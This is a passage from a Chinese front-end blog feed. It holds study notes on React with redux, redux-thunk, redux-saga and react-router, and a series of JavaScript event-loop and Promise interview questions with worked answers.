=&gt; getInitialState =&gt; componentWillMount() =&gt; render=&gt; componentDidMount() UpdatingcomponentWillReceiveProps(nextProps) =&gt; shouldComponentUpdate(nextProps, nextState) =&gt; componentWillUpdate(nextProps, nextState) =&gt; render =&gt; componentDidUpdate(prevProps, prevState) UnmountingcomponentWillUnmount() 其中，shouldComponentUpdate 比较特殊shouldComponentUpdate(nextProps, nextState) { //两个参数分别表示：传进来的props和state if (nextProps.content !== this.props.content) { return true; } else { return false; }} 正式开发流程和主要依赖styled-componentsnpm i –save styled-components normalize.js使用 styled-components 变成全局样式导入123456789101112131415// normalize.jsimport &#123; createGlobalStyle &#125; from 'styled-components'const GlobalStyle = createGlobalStyle` body &#123; margin: 0; &#125;`export &#123; GlobalStyle &#125;// src/App.jsimport &#123; GlobalStyle &#125;&lt;GlobalStyle /&gt;&lt;Header /&gt; iconfont.js使用 styled-components 变成 GlobalIconfontStyle 全局样式导入12&lt;GlobalStyle /&gt;&lt;GlobalIconfontStyle /&gt; react-transition-group123456// src/common/header/index.jsimport &#123; CSSTransition&#125; from 'react-transition-group'&lt;CSSTransition in=&#123;this.state.focus&#125; timeout=&#123;200&#125; classNames='slide'&gt; &lt;NavSearch&gt;&lt;/NavSearch&gt;&lt;/CSSTransition&gt; antdnpm i antd –save 123import 'antd/dist/antd.css'import &#123; Input &#125; from 'antd';&lt;Input placeholder='antd input' /&gt; //注意UI组件首字母大写 reduxnpm i redux store提供的三种方法：store.dispatch() 组件向store传递action的唯一方法store.subscribe() 监听store中的数据，一旦数据变化，就执行这个函数store.getState() 获取store中的最新的数据。 数据被更新了，那么页面自然也就被更新了1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// 创建store// src/store/index.jsimport &#123; createStore &#125; from 'redux'import reducer from './reducer'; //笔记本// Redux设计思想：Web 应用是一个状态机，视图与状态是一一对应的；所有的状态，保存在一个对象里面const store = createStore( //创建仓库 reducer, //将笔记本传递给仓库 window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__());export default store// 创建reducer// src/store/reducer.jsconst defaultState = &#123; inputVal: '', list: []&#125;const reducer = (state=defaultState, action) =&gt; &#123; switch(action.type) &#123; case CHANGE_INPUT_VALUE: const newState = &#123;...prevState, ...action.value&#125; newState.inputVal = action.value return newState case INIT_TODO_LIST: const newState = &#123;...prevState,...&#123; list: action.list &#125;&#125; return newState default: return state &#125;&#125;export default reducer// src/Todolistimport store from './store/index'class TodoList extends Component &#123; constructor(props) &#123; super(props) this.state = store.getState() this.handleInputChange = this.handleInputChange.bind(this) //subscribe用来监听store，一旦store中存储的数据发生变化，就自动执行这个函数 store.subscribe(this.handleStoreChange) &#125; handleInputChange(e) &#123; const action = &#123; type: CHANGE_INPUT_VALUE, value: e.target.value &#125; //将这个数据变更的信息传递给store。 dispatch是组件向store发送action的唯一方法 store.dispatch(action) &#125; handleStoreChange() &#123; //store.getState() 用来获取store中最新的数据 this.setState(store.getState()) &#125; // redux发送异步请求获取数据的代码放在componentDidMount函数里 componentDidMount() &#123; const action = &#123; type: INIT_TODO_LIST &#125; store.dispatch(action) &#125;&#125; 在实际项目中，需要将action的type名提取出来，并将每个action封装。分别创建 actionTypes.js 和 actionCreators.js 在容器组件中拆分出UI组件Todolist就是容器组件，它的render方法中返回了很多的UI组件，所以有必要把他们拆分一下。拆分后，UI组件里面的this.state都无法获取到了，这时就需要父组件（即容器组件）将this.state和方法作为参数，传递给UI组件。UI组件中，需要将原先所有的this.state换成this.props，将原先的this.方法名换成this.props.方法名。 若此时仍需要向方法传递一个参数，就不能直接写成这种形式onClick={this.props.handleDeleteClick(index)}替换为onClick={() =&gt; { this.props.handleDeleteClick(index) }}onClick={() =&gt; { this.props.handleDeleteClick.bind(this, index) }} 123456789101112131415161718192021222324252627282930313233343536373839404142434445// src/Todolistrender() &#123; return ( //将this.state、方法都作为参数传递给UI组件 &lt;TodolistUI inputValue=&#123;this.state.inputValue&#125; list=&#123;this.state.list&#125; handleInputChange=&#123;this.handleInputChange&#125; handleBtnClick=&#123;this.handleBtnClick&#125; handleDeleteClick=&#123;this.handleDeleteClick&#125; /&gt; )&#125;// src/TodolistUIimport React, &#123; Component, Fragment &#125; from 'react';import &#123; Input, Button, List &#125; from 'antd';// 无状态组件(没有state的组件，只有一个render方法)改写成函数，提高性能const TodoListUI = (props) =&gt; &#123; return ( // 改写后的函数接收一个参数props,可以将this.props.x 换成props.x )&#125;// 或者不用赋值式函数字面量，写成函数声明function TodoListUI(props) &#123; return ( &lt;Fragment&gt; &lt;Input value=&#123;props.inputVal&#125; onChange=&#123;props.handleInputChange&#125; placeholder="input here" style=&#123;&#123;width: "300px", marginRight: "15px"&#125;&#125; /&gt; &lt;Button onClick=&#123;props.handleBtnClick&#125; type="primary"&gt;Submit&lt;/Button&gt; &lt;List bordered dataSource=&#123;props.list&#125; renderItem=&#123;(item, index) =&gt; (&lt;List.Item onClick=&#123;() =&gt; &#123;props.handleItemDel(index)&#125;&#125;&gt;&#123;item&#125;&lt;/List.Item&gt;)&#125;&gt; &lt;/List&gt; &lt;/Fragment&gt; )&#125;export default TodoListUI 使用 react-redux 中间件, 处理异步请求npm i redux-thunk –save 如果将redux发送异步请求获取数据的代码都放在componentDidMount钩子函数中，随着业务逻辑的增加，这个钩子函数可能会变的越来越臃肿。可以利用redux-thunk将redux发送异步请求获取数据的代码放在其他函数中。不使用redux-thunk时，action只能是一个对象，有了redux-thunk之后，action就可以是一个函数了。如果不使用redux-thunk，并且让action是一个函数的话，就会报以下错误 Error: Actions must be plain objects. Use custom middleware for async actions。就是说：action必须是一个对象1234567891011121314151617181920212223242526272829303132333435363738// src/store/index.jsimport &#123; createStore, applyMiddleware, compose &#125; from 'redux'import reducer from './reducer'import thunk from 'redux-thunk'const enhancer = compose( applyMiddleware(thunk), window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__())const store = createStore(reducer, enhancer)export default store// src/store/actionCreators.jsimport axios from 'axios';export const getListItem = () =&gt; &#123; return (dispatch) =&gt; &#123; //store的dispatch方法可以作为一个参数被接收 axios.get('http://api/get_list') .then((res) =&gt; &#123; const data = res.data const action = getInitialListItemAction(data) dispatch(action) &#125;) &#125;&#125;// src/Todolist.jsimport getListItem from './store/actionCreators';componentDidMount() &#123; const action = getListItem() store.dispatch(action) //当dispatch接收到一个函数参数时，会自动执行这个函数&#125;// 代码原理 就是把异步请求数据的代码放在其它函数中，然后在componentDidMount中用dispatch方法执行这个函数即可 使用 react-saga 中间件, 处理异步请求npm i redux-saga –save 12345678910111213141516171819202122232425262728293031323334353637383940414243// src/store/index.jsimport &#123; createStore, applyMiddleware, compose &#125; from 'redux'import reducer from './reducer'import createSagaMiddleware from 'redux-saga'import sagas from './sagas'const sagaMiddleware = createSagaMiddleware()const enhancer = compose( applyMiddleware(sagaMiddleware), window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__())const store = createStore(reducer, enhancer)sagaMiddleware.run(sagas)export default store// src/store/sagas.jsimport axios from 'axios'import &#123; call, put, takeEvery, takeLatest &#125; from 'redux-saga/effects'import &#123; GET_INIT_TODO_LIST &#125; from './actionTypes'import &#123; initTodoListAction &#125; from './actionCreators'function* getInitTodoList() &#123; try &#123; const res = yield axios.get('https://easy-mock.com/mock/5ca47d2fac5abe5a8d89b977/react/api/todolist') const list = res.data.list const action = initTodoListAction(list) yield put(action) &#125; catch(e) &#123; console.log('error') &#125;&#125;function* mySaga(params) &#123; yield takeEvery(GET_INIT_TODO_LIST, getInitTodoList)&#125;export default mySaga react-reduxnpm i react-redux –save react-redux就是用来将react和redux连接起来。通过react-redux中的connect方法，将组件Todolist中的state，dispatch映射到props。mapStateToProps和mapDispatchToProps分别实现映射。之后，Todolist组件中所有的 this.state 和 this.方法名，都直接替换成：this.props 和 this.props.方法名。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// src/index.jsimport React from 'react'import ReactDOM from 'react-dom'import TodoList from './TodoList'import &#123; Provider &#125; from 'react-redux'import store from './store'const App = ( &lt;Provider store=&#123;store&#125;&gt; &lt;TodoList /&gt; &lt;/Provider&gt;)const rootElement = document.getElementById('root')ReactDOM.render(App, rootElement)// src/TodoList.jsimport React, &#123; Component &#125; from 'react'import &#123; connect &#125; from 'react-redux'class TodoList extends Component &#123; render() &#123; return ( // ... ) &#125;&#125;const mapStateToProps = (state) =&gt; &#123; return &#123; inputVal: state.inputVal, list: state.list &#125;&#125;const mapDispatchTpProps = (dispatch) =&gt; &#123; return &#123; changeInputVal(e) &#123; const action = changeInputValAction(e.target.value) dispatch(action) &#125; &#125;&#125;// TodoList是个UI组件，最终导出的是 用connect集成 TodoList UI组件、数据和业务逻辑 而 包装成的容器组件export default connect(mapStateToProps, mapDispatchTpProps)(TodoList) immutable、redux-immutablenpm i immutablenpm i redux-immutable 用于将对象设置为不可更改。可用于保护state，state是不允许修改的，为了防止误修改，可以借助immutable库。12345678910111213141516171819202122232425262728293031323334353637383940414243// src/pages/home/store/reducer.jsimport &#123; fromJS &#125; from 'immutable'const defaultState = fromJS(&#123; topicList: [], articleList: [], recommendList: [], articlePage: 1, showScroll: false&#125;)const changeHomeData = (state, action) =&gt; &#123; return state.merge(&#123; topicList: fromJS(action.topicList), articleList: fromJS(action.articleList), recommendList: fromJS(action.recommendList) &#125;)&#125;const getMoreArticleList = (state, action) =&gt; &#123; const newArticleList = [...state.get('articleList'), ...fromJS(action.list)] const nextPage = action.nextPage return state.merge(&#123; articleList: newArticleList, articlePage: nextPage &#125;)&#125;const reducer = (state=defaultState, action) =&gt; &#123; switch(action.type) &#123; case CHANGE_HOME_DATA: return changeHomeData(state, action) case GET_MORE_ARTICLE_LIST: return getMoreArticleList(state, action) case CHANGE_SCROLLTOP_SHOW: return state.set('showScroll', action.flag) default: return state &#125;&#125;export default reducer 使用，redux-immutable1234567891011// src/store/reducer.jsimport &#123; combineReducers &#125; from 'redux'// 替换为import &#123; combineReducers &#125; from 'redux-immutable'// 使用redux-immutable之后, 就不能使用类似this.state.header.inputVal// 替换为this.state.get('header').get('inputVal')this.state.getIn(['header', 'inputVal']) // 简写 redux 模块划分，拆分reducer随着业务逻辑的增加，代码会变的愈来愈多，reducer会变得越来越大，所以最好将其拆分成不同的块，每个块对应一个reducer.js文件。1234567891011121314151617// src/store/reducer.jsimport &#123; combineReducers &#125; from 'redux-immutable'import &#123; reducer as headerReducer &#125; from '../common/header/store'import &#123; reducer as loginReducer &#125; from '../pages/login/store'const reducer = combineReducers(&#123; header: headerReducer, login: loginReducer&#125;)export default reducer// src/pages/login/index.jsconst mapStateToProps = (state) =&gt; (&#123; isLogin: state.getIn(['login', 'login'])&#125;) react-routernpm install react-router-dom 作用就是根据不同的url，显示不同的页面信息12345678import &#123; BrowserRouter as Router, Route, Link &#125; from 'react-router-dom'&lt;Router&gt; &lt;Route path='/' exact cmponent=&#123;Home&#125;&gt;&lt;/Route&gt; &lt;Route path='/about/' exact cmponent=&#123;About&#125;&gt;&lt;/Route&gt;&lt;/Router&gt;&lt;Link to='/'&gt;Jump to&lt;/Link&gt; PureComponent使用 PureComponent 代替 Component，需要immutable， 可提升性能。 异步组件和withRouternpm i react-loadable 123456789101112131415161718192021222324// /pages/detail/loadable.jsimport Loadable from 'react-loadable'const LoadableComponent = Loadable(&#123; loader: () =&gt; import('./index'), loading: Loading // loading 效果&#125;)const Loading = () =&gt; &#123; return &lt;div&gt;loading...&lt;/div&gt;&#125;export default () =&gt; &lt;LoadableComponent /&gt;// /pages/detail/index.jsimport &#123; withRouter &#125; from 'react-router-dom'export default connent(null, null)(withRouter(Detail))// App.js// import Home from './pages/detail', 替换为import Detail from './pages/detail/loadable']]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 疑难杂症,专治各种不服]]></title>
    <url>%2F2019%2F04%2F12%2FJS%2FJavaScript-%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87-%E4%B8%93%E6%B2%BB%E5%90%84%E7%A7%8D%E4%B8%8D%E6%9C%8D%2F</url>
    <content type="text"><![CDATA[valueOf() 返回指定对象的原始值 语法object.valueOf() 不同类型对象的valueOf()方法的返回值Array 返回数组对象本身。Boolean 布尔值。Date 存储的时间是从 1970 年 1 月 1 日午夜开始计的毫秒数 UTC。Function 函数本身。Number 数字值。Object 对象本身。这是默认情况。String 字符串值。Math 和 Error 对象 没有 valueOf 方法。 可覆盖Object.prototype.valueOf()来调用自定义方法 toString() 返回一个表示该对象的字符串 语法object.toString() 描述每个对象都有一个toString()方法，当该对象被表示为一个文本值时，或者一个对象以预期的字符串方式引用时自动调用。默认情况下，toString()方法被每个Object对象继承。如果此方法在自定义对象中未被覆盖，toString() 返回 “[object type]”，其中type是对象的类型。 Object.prototype.toString.call(null) =&gt; ‘[object Null]’Object.prototype.toString.call(undefined) =&gt; ‘[object Undefined]’Object.prototype.toString.call(Math) =&gt; ‘[object Math]’Object.prototype.toString.call({}) =&gt; ‘[object Object]’Object.prototype.toString.call([]) =&gt; ‘[object Array]’ 双等号 == 运算规则 undefined == null，结果是true。且它俩与所有其他值比较的结果都是falseString == Boolean，需要两个操作数同时转为NumberString/Boolean == Number，需要String/Boolean转为NumberObject == Primitive，需要Object转为Primitive(具体通过valueOf和toString方法) 参考: https://zhuanlan.zhihu.com/p/21650547]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 单线程JavaScript的异步机制与经典for循环]]></title>
    <url>%2F2019%2F04%2F10%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-%E5%8D%95%E7%BA%BF%E7%A8%8BJavaScript%E7%9A%84%E5%BC%82%E6%AD%A5%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%8F%E5%85%B8for%E5%BE%AA%E7%8E%AF%2F</url>
    <content type="text"><![CDATA[单线程JavaScript的异步机制与经典for循环1234567for (var i = 1; i &lt;= 5; i++) &#123; console.log(i); setTimeout(function timer() &#123; console.log(i); &#125;, i * 1000);&#125; 答案： 先同时输出 12345；再输出5个6，每隔一秒输出一个原理： JavaScript 是单线程的，所有的任务排队，按顺序一一执行。异步执行可以实现多任务并发。解析：等执行栈内同步的 for 循环执行结束出栈后，线程才会从任务队列里拉取异步的定时器的回调函数。根据作用域的工作原理，尽管循环中的五个函数是在各个迭代中分别定义的，但是它们都被封闭在一个共享的全局作用域中，因此实际上只有一个 i。 异步机制：宿主环境为JavaScript创建线程时，会创建堆(heap)和栈(stack)， 堆内存储JavaScript对象，栈内存储执行上下文同步任务：执行栈内，执行上下文的同步任务按序执行执行完即退栈。异步任务：异步任务执行时，该异步任务进入等待状态（不入栈），与此同时，通知线程“当触发该异步事件的时候（或该异步操作响应返回时），需向任务队列插入一个事件”，当实际上异步事件触发或异步操作响应返回时，线程向任务队列插入相应的回调事件。当执行栈清空后，线程从任务队列取出一个事件消息，其对应异步任务（函数）结束等待状态，进入执行栈，执行回调函数。如果该事件消息未绑定回调，则执行完任务后退栈，这个消息会被丢弃。当线程空闲（即执行栈清空）时继续拉取消息队列下一轮消息（next tick，事件循环流转一次称为一次tick）。 修复：1、错误的闭包1234567for (var i = 1; i &lt;= 5; i++) &#123; (function() &#123; setTimeout( function() &#123; console.log(i); &#125;, i*1000) &#125;)()&#125; 依然全是 6。因为，新加上的 IIFE 作用域是”空的”，它并没有自己的变量。 执行栈清空后，线程从任务队列里读取回调函数，它们还是引用那个唯一的全局变量i 2、正确的闭包12345678for (var i = 1; i &lt;= 5; i++) &#123; (function() &#123; var j = i // 在闭包作用域中，通过添加自己的变量，每次迭代都捕获i的副本 setTimeout( function() &#123; console.log(j); &#125;, j*1000) //至于时间这里，是i 是j无所谓 &#125;)()&#125; 3、更简洁的闭包：1234567for (var i = 1; i &lt;= 5; i++) &#123; (function(j) &#123; setTimeout( function() &#123; console.log(j); &#125;, j*1000) &#125;)(i) &#125; 3、ES6块作用域1234567for (var i = 1; i &lt;= 5; i++) &#123; let j = i setTimeout( function() &#123; console.log(j); &#125;, j*1000)&#125; 4、直接在for循环头部里，每次迭代都声明一次。随后的每个迭代都会使用上一个迭代结束时的值来初始化这个变量123456for (let i = 1; i &lt;= 5; i++) &#123; setTimeout( function() &#123; console.log(i); &#125;, i*1000)&#125;]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Review</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 Promise]]></title>
    <url>%2F2019%2F04%2F10%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-Promise%2F</url>
    <content type="text"><![CDATA[题目一 1234567891011 const promise = new Promise((resolve, reject) =&gt; &#123; console.log(1) resolve() console.log(2)&#125;)promise.then(() =&gt; &#123; console.log(3)&#125;)console.log(4) 解析：首先 Promise 新建后立即执行，所以会先输出 1，2，而 Promise.then() 内部的代码在 当次 事件循环的 结尾 立刻执行 ，所以会继续输出4，最后输出3。答案：1 2 4 3 题目二 12345678910111213 const promise = new Promise((resolve, reject) =&gt; &#123; resolve('success1') reject('error') resolve('success2')&#125;)promise .then((res) =&gt; &#123; console.log('then:', res) &#125;) .catch((err) =&gt; &#123; console.log('catch:', err) &#125;) 解析：resolve 函数将 Promise 对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；reject 函数将 Promise 对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。而一旦状态改变，就不会再变。所以 代码中的reject(‘error’); 不会有作用。Promise 只能 resolve 一次，剩下的调用都会被忽略。所以 第二次的 resolve(‘success2’); 也不会有作用。答案：then: success1 题目三1234Promise.resolve(1) .then(2) .then(Promise.resolve(3)) .then(console.log) 解析：Promise.resolve 方法的参数如果是一个原始值，或者是一个不具有 then 方法的对象，则 Promise.resolve 方法返回一个新的 Promise 对象，状态为resolved，Promise.resolve 方法的参数，会同时传给回调函数。then 方法接受的参数是函数，而如果传递的并非是一个函数，它实际上会将其解释为 then(null)，这就会导致前一个 Promise 的结果会穿透下面。答案：1 题目四红灯三秒亮一次，绿灯一秒亮一次，黄灯两秒亮一次, 如何让这三个灯按照这个规律不断交替重复亮灯？（用Promse实现。 解析：红灯三秒亮一次，绿灯一秒亮一次，黄灯2秒亮一次，意思就是3秒，执行一次 red 函数，2秒执行一次 green 函数，1秒执行一次 yellow 函数，不断交替重复亮灯，意思就是按照这个顺序一直执行这3个函数，这步可以就利用递归来实现。主要考查Promise的应用，JavaScript 异步运行机制（一次事件循环中，同步代码先入执行栈执行，异步代码分情况将其任务注册到任务队列中。只有执行栈清空，主线程才会从任务队列中读取任务，使其入栈执行。setTimeout相关的异步队列会挂起直到主进程空闲。如果使用类似 while(true)无限循环，会永久占据主线程，使得执行栈永远不清空，setTimeout的函数永远不会执行！），以及递归。 1234567891011121314151617181920212223242526272829303132333435363738三个亮灯函数function red() &#123; console.log('red')&#125;function green() &#123; console.log('green')&#125;function yellow() &#123; console.log('yellow')&#125;时间控制var light = function(cb, timer)&#123; return new Promise((resolve,reject) =&gt; &#123; setTimeout(function()&#123; cb() resolve() &#125;, timer) &#125;)&#125;var step = function()&#123; Promise.resolve() .then(function()&#123; return light(red, 3000) &#125;) .then(function()&#123; return light(green, 1000) &#125;) .then(function()&#123; return light(yellow, 2000) &#125;) .then(function()&#123; step() &#125;) &#125;step() 题目五实现 mergePromise 函数，把传进去的数组按顺序先后执行，并且把返回的数据先后放到数组 data 中。12345678910111213141516171819202122232425262728293031323334353637const timeout = ms =&gt; new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve() &#125;, ms)&#125;)const ajax1 = () =&gt; timeout(2000).then(() =&gt; &#123; console.log('1') return 1&#125;)const ajax2 = () =&gt; timeout(1000).then(() =&gt; &#123; console.log('2') return 2&#125;)const ajax3 = () =&gt; timeout(2000).then(() =&gt; &#123; console.log('3') return 3&#125;)const mergePromise = ajaxArray =&gt; &#123; // 在这里实现你的代码&#125;mergePromise([ajax1, ajax2, ajax3]).then(data =&gt; &#123; console.log('done') console.log(data) // data 为 [1, 2, 3]&#125;)// 要求分别输出// 1// 2// 3// done// [1, 2, 3] 解析：对于异步函数来说，并不会按顺序执行完一个，再执行后一个。这道题就是考用 Promise 控制异步流程。 1234567891011121314151617// 保存数组中的函数执行后的结果var data = []// Promise.resolve方法调用时不带参数，直接返回一个resolved状态的 Promise 对象。var sequence = Promise.resolve()ajaxArray.forEach(function (item) &#123; // 第一次的 then 方法用来执行数组中的每个函数 // 第二次的 then 方法接受数组中的函数执行后返回的结果，并把结果添加到 data 中，然后把 data 返回。 sequence = sequence.then(item).then(function (res) &#123; data.push(res) return data &#125;)&#125;)// 遍历结束后，返回一个 Promise，也就是 sequence， 他的 [[PromiseValue]] 值就是 data，而 data（保存数组中的函数执行后的结果）也会作为参数，传入下次调用的 then 方法中。return sequence 题目六以下代码最后输出什么？1234567891011setTimeout(function() &#123; console.log('1')&#125;)new Promise(function(resolve) &#123; console.log('2')&#125;).then(function() &#123; console.log('3')&#125;)console.log('4') 解析： macro-task(宏任务)：包括整体代码script、setTimeout、setInterval、setImmediate、I/O、UI Rendering.micro-task(微任务)：Promise，process.nextTick、MutationObserver.不同类型的任务会进入对应的Event Queue，比如setTimeout和setInterval会进入相同的Event Queue。事件循环的顺序，决定js代码的执行顺序。进入整体代码(宏任务)后，开始第一次循环。接着执行所有的微任务。然后再次从宏任务开始，找到其中一个任务队列执行完毕，再执行所有的微任务。 1 这段代码作为宏任务，进入主线程。2 先遇到setTimeout，那么将其回调函数注册后分发到宏任务Event Queue。3 接下来遇到了Promise，new Promise立即执行，then函数分发到微任务Event Queue。4 遇到console.log()，立即执行。5 好啦，整体代码script作为第一个宏任务执行结束，看看有哪些微任务？我们发现了then在微任务Event Queue里面，执行。6 ok，第一轮事件循环结束了，我们开始第二轮循环，当然要从宏任务Event Queue开始。我们发现了宏任务Event Queue中setTimeout对应的回调函数，立即执行。7 结束。答案：2 4 1 题目七以下代码最后输出什么？123456789101112131415161718192021222324252627282930313233343536console.log('1')setTimeout(function() &#123; console.log('2') process.nextTick(function() &#123; console.log('3') &#125;) new Promise(function(resolve) &#123; console.log('4') resolve() &#125;).then(function() &#123; console.log('5') &#125;)&#125;)process.nextTick(function() &#123; console.log('6')&#125;)new Promise(function(resolve) &#123; console.log('7') resolve()&#125;).then(function() &#123; console.log('8')&#125;)setTimeout(function() &#123; console.log('9') process.nextTick(function() &#123; console.log('10') &#125;) new Promise(function(resolve) &#123; console.log('11') resolve() &#125;).then(function() &#123; console.log('12') &#125;)&#125;) 解析：javascript是一门单线程语言，Event Loop是js实现异步的一种方法，也是javascript的执行机制。javascript是一门单线程语言，在最新的HTML5中提出了Web-Worker，但javascript是单线程这一核心仍未改变。所以一切javascript版的”多线程”都是用单线程模拟出来的，不管是什么新框架新语法糖实现的所谓异步，其实都是用同步的方法去模拟的，牢牢把握住单线程这点非常重要。一切javascript多线程都是纸老虎！事件循环：任务分为两类：同步任务，异步任务。同步和异步任务分别进入不同的执行”场所”，同步的进入主线程，异步的进Event Table并注册函数。当指定的事情完成时，Event Table会将这个函数移入Event Queue。当指定的事情完成时，Event Table会将这个函数移入Event Queue。当指定的事情完成时，Event Table会将这个函数移入Event Queue。答案：1，7，6，8，2，4，3，5，9，11，10，12(请注意，node环境下的事件监听依赖libuv与前端环境不完全相同，输出顺序可能会有误差) 题目八以下代码最后输出什么？123456789101112131415161718192021const first = () =&gt; (new Promise((resolve, reject) =&gt; &#123; console.log(3) let p = new Promise((resolve, reject) =&gt; &#123; console.log(7) setTimeout(() =&gt; &#123; console.log(5) resolve(6) &#125;, 0) resolve(1) &#125;) resolve(2) p.then((arg) =&gt; &#123; console.log(arg) &#125;)&#125;))first().then((arg) =&gt; &#123; console.log(arg)&#125;)console.log(4) 答案：3 7 4 1 2 5解析：这道题就其实和 Promise 的关系不太大，主要是需要理解 JS执行机制。先执行宏任务，主script ，new Promise立即执行，输出【3】，执行 p 这个new Promise 操作，输出【7】，发现 setTimeout，将回调放入下一轮任务队列（Event Queue），p 的 then，姑且叫做 then1，放入微任务队列，发现 first 的 then，叫 then2，放入微任务队列。执行console.log(4)，输出【4】，宏任务执行结束。再执行微任务，执行 then1，输出【1】，执行 then2，输出【2】。到此为止，第一轮事件循环结束。开始执行第二轮。先执行宏任务里面的，也就是 setTimeout 的回调，输出【5】。resolve(6) 不会生效，因为 p 这个 Promise 的状态一旦改变就不会在改变了。 题目九以下代码最后输出什么？ 1234567891011121314151617181920212223242526272829303132333435363738394041424344console.log('script start')async function async1() &#123; await async2() console.log('async1 end')&#125;async function async2() &#123; console.log('async2 end') &#125;async1()setTimeout(function() &#123; console.log('setTimeout')&#125;, 0)new Promise(resolve =&gt; &#123; console.log('Promise') resolve()&#125;) .then(function() &#123; console.log('promise1') &#125;) .then(function() &#123; console.log('promise2') &#125;)console.log('script end')// async/await 在底层转换成了 promise 和 then 回调函数。也就是说，这是 promise 的语法糖。// 每次我们使用 await, 解释器都创建一个 promise 对象，然后把剩下的 async 函数中的操作放到 then 回调函数中。// 从字面意思来理解，async 是“异步”的简写，而 await 是 async wait 的简写可以认为是等待异步方法执行完成。// 结果：// script start// async2 end// Promise// script end// async1 end// promise1// promise2// setTimeout 题目十 1234567891011121314有 8 个图片资源的 url，已经存储在数组 urls 中（即urls = ['http://example.com/1.jpg', ...., 'http://example.com/8.jpg']），而且已经有一个函数 function loadImg，输入一个 url 链接，返回一个 Promise，该 Promise 在图片下载完成的时候 resolve，下载失败则 reject。但是我们要求，任意时刻，同时下载的链接数量不可以超过 3 个。请写一段代码实现这个需求，要求尽可能快速地将所有图片下载完成。var urls = [ 'https://www.kkkk1000.com/images/getImgData/getImgDatadata.jpg', 'https://www.kkkk1000.com/images/getImgData/gray.gif', 'https://www.kkkk1000.com/images/getImgData/Particle.gif', 'https://www.kkkk1000.com/images/getImgData/arithmetic.png', 'https://www.kkkk1000.com/images/getImgData/arithmetic2.gif', 'https://www.kkkk1000.com/images/getImgData/getImgDataError.jpg', 'https://www.kkkk1000.com/images/getImgData/arithmetic.gif', 'https://www.kkkk1000.com/images/wxQrCode2.png']function loadImg(url) &#123; return new Promise((resolve, reject) =&gt; &#123; const img = new Image() img.onload = function () &#123; console.log('一张图片加载完成') resolve() &#125; img.onerror = reject img.src = url &#125;)&#125; 解析：题目的意思是需要我们这么做，先并发请求 3 张图片，当一张图片加载完成后，又会继续发起一张图片的请求，让并发数保持在 3 个，直到需要加载的图片都全部发起请求。用 Promise 来实现就是，先并发请求3个图片资源，这样可以得到 3 个 Promise，组成一个数组，就叫promises 吧，然后不断的调用 Promise.race 来返回最快改变状态的 Promise，然后从数组（promises ）中删掉这个 Promise 对象，再加入一个新的 Promise，直到全部的 url 被取完，最后再使用 Promise.all 来处理一遍数组（promises ）中没有改变状态的 Promise。答案：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657var urls = [ 'https://www.kkkk1000.com/images/getImgData/getImgDatadata.jpg', 'https://www.kkkk1000.com/images/getImgData/gray.gif', 'https://www.kkkk1000.com/images/getImgData/Particle.gif', 'https://www.kkkk1000.com/images/getImgData/arithmetic.png', 'https://www.kkkk1000.com/images/getImgData/arithmetic2.gif', 'https://www.kkkk1000.com/images/getImgData/getImgDataError.jpg', 'https://www.kkkk1000.com/images/getImgData/arithmetic.gif', 'https://www.kkkk1000.com/images/wxQrCode2.png']function loadImg(url) &#123; return new Promise((resolve, reject) =&gt; &#123; const img = new Image() img.onload = function () &#123; console.log('一张图片加载完成') resolve() &#125; img.onerror = reject img.src = url &#125;)&#125;function limitLoad(urls, handler, limit) &#123; // 对数组做一个拷贝 const sequence = [].concat(urls) let promises = [] //并发请求到最大数 promises = sequence.splice(0, limit).map((url, index) =&gt; &#123; // 这里返回的 index 是任务在 promises 的脚标，用于在 Promise.race 之后找到完成的任务脚标 return handler(url).then(() =&gt; &#123; return index &#125;) &#125;) // 利用数组的 reduce 方法来以队列的形式执行 return sequence.reduce((last, url, currentIndex) =&gt; &#123; return last.then(() =&gt; &#123; // 返回最快改变状态的 Promise return Promise.race(promises) &#125;).catch(err =&gt; &#123; // 这里的 catch 不仅用来捕获 前面 then 方法抛出的错误 // 更重要的是防止中断整个链式调用 console.error(err) &#125;).then((res) =&gt; &#123; // 用新的 Promise 替换掉最快改变状态的 Promise promises[res] = handler(sequence[currentIndex]).then(() =&gt; &#123; return res &#125;) &#125;) &#125;, Promise.resolve()).then(() =&gt; &#123; return Promise.all(promises) &#125;)&#125;limitLoad(urls, loadImg, 3)/*因为 limitLoad 函数也返回一个 Promise，所以当 所有图片加载完成后，可以继续链式调用limitLoad(urls, loadImg, 3).then(() =&gt; &#123; console.log('所有图片加载完成')&#125;).catch(err =&gt; &#123; console.error(err)&#125;)*/]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Review</tag>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 数组去重]]></title>
    <url>%2F2019%2F04%2F10%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%2F</url>
